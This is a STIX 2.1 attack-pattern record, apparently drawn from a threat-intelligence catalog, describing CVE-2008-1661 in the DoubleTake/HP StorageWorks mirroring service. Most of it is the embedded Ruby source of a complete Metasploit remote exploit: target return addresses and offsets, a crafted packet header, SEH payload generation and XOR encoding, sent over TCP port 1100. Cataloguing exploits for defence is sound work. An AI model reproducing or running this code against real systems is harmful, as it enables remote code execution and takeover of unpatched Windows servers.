{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b0df24ff-88f4-49ed-aff8-c57879a95b5e",
    "created": "2024-08-14T16:47:31.030968Z",
    "modified": "2024-08-14T16:47:31.030973Z",
    "name": "DoubleTake/HP StorageWorks Storage Mirroring Service Authentication Overflow",
    "description": " This module exploits a stack buffer overflow in the authentication mechanism of NSI Doubletake which is also rebranded as HP Storage Works. This vulnerability was found by Titon of Bastard Labs. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/doubletake.rb",
            "external_id": "doubletake.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1661"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DoubleTake/HP StorageWorks Storage Mirroring Service Authentication Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the authentication mechanism of\n          NSI Doubletake which is also rebranded as HP Storage Works. This vulnerability\n          was found by Titon of Bastard Labs.\n      },\n      'Author'         => [ 'ri0t <ri0t[at]ri0tnet.net>' ],\n      'References'     =>\n        [\n          ['CVE', '2008-1661' ],\n          ['OSVDB', '45924' ],\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'win',\n\n      'Targets'        =>\n        [\n          ['doubletake 4.5.0',      { 'Ret' => 0x006f5fa7, 'Offset' => 5544 } ],\n          ['doubletake 4.4.2',      { 'Ret' => 0x0074e307, 'Offset' => 944  } ],\n          ['doubletake 4.5.0.1819', { 'Ret' => 0x006e62dd, 'Offset' => 5544 } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-06-04'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(1100)\n      ])\n  end\n\n  def exploit\n\n    connect\n\n    print_status(\"Trying target #{target.name}...\")\n\n    header =\n      \"\\x00\\x02\\x00\\x01\\x27\\x30\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x00\"+\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\"+\n      \"\\x00\\x00\\x00\\x1e\\x00\\x00\\x00\\x01\\x00\\x01\"\n\n    xor = Rex::Encoding::Xor::Byte\n    filler =  rand_text_english(1) * (target['Offset'])\n    seh = generate_seh_payload(target.ret)\n    buffercoded = xor.encode(seh+payload.encoded, [0xf0].pack(\"C\"))\n    sploit =  header + filler + buffercoded[0]\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-06-04",
    "x_mitre_platforms": [
        "win'"
    ]
}